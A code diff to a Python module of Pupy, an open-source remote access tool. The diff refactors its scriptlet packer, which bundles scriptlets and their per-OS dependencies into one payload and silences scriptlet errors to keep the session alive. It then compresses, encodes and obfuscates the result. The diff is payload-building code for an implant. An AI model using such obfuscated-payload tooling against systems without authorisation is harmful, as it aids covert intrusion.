@@ -1,11 +1,20 @@
 #!/usr/bin/env python
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
 import os, os.path, cPickle
-from pupylib.payloads.python_packer import gen_package_pickled_dic, wrap_try_except
+from pupylib.payloads  import dependencies
 from pupylib.utils.obfuscate import compress_encode_obfs
+
+ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__),"..","packages"))
+
+def wrap_try_except(code):
+    full_code = "try:\n"
+    for line in code.split("\n"):
+            full_code += "\t"+line+"\n"
+    full_code += "except Exception:\n\tpass\n"
+    return full_code
 
 class ScriptletArgumentError(Exception):
     pass
@@ -34,30 +43,44 @@ class Scriptlet(object):
             res+="\t\t\t{:<10}\n".format("no arguments")
         return res
 
-ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..","packages"))
 
 class ScriptletsPacker(object):
-    def __init__(self, debug=False):
-        self.scriptlets=[]
-        self.debug=debug
+    def __init__(self, os=None, arch=None, debug=False):
+        self.scriptlets = set()
+        self.debug = debug
+        self.os = os or 'all'
+        self.arch = arch
+
     def add_scriptlet(self, sl):
-        self.scriptlets.append(sl)
+        self.scriptlets.add(sl)
+
     def pack(self):
-        fullpayload=[]
-        fullpayload.append("import pupyimporter")
-        all_packages=[]
-        for sl in self.scriptlets:
-            all_packages.extend(sl.dependencies)
-        all_packages=list(set(all_packages))
-        for p,n in all_packages:
-            modules_dic=gen_package_pickled_dic(os.path.join(ROOT, p.replace("/",os.sep)), n)
-            fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
-        for sl in self.scriptlets:
+        fullpayload = []
+
+        requirements = set()
+
+        for scriptlet in self.scriptlets:
+            if type(scriptlet.dependencies) == dict:
+                for dependency in scriptlet.dependencies.get('all', []):
+                    requirements.add(dependency)
+
+                for dependency in scriptlet.dependencies.get(self.os, []):
+                    requirements.add(dependency)
+            else:
+                for dependency in scriptlet.dependencies:
+                    requirements.add(dependency)
+
+        if requirements:
+            fullpayload += [
+                'import pupyimporter',
+                dependencies.importer(requirements, os=self.os)
+            ]
+
+        for scriptlet in self.scriptlets:
             if self.debug:
-                fullpayload.append(sl.generate())
-            else: 
+                fullpayload.append(scriptlet.generate(self.os))
+            else:
                 #if not in debug mode, catch all exception to continue an have a session if a scriptlet raises an exception
-                fullpayload.append(wrap_try_except(sl.generate()))
+                fullpayload.append(wrap_try_except(scriptlet.generate(self.os)))
+
         return compress_encode_obfs('\n'.join(fullpayload))
-
-
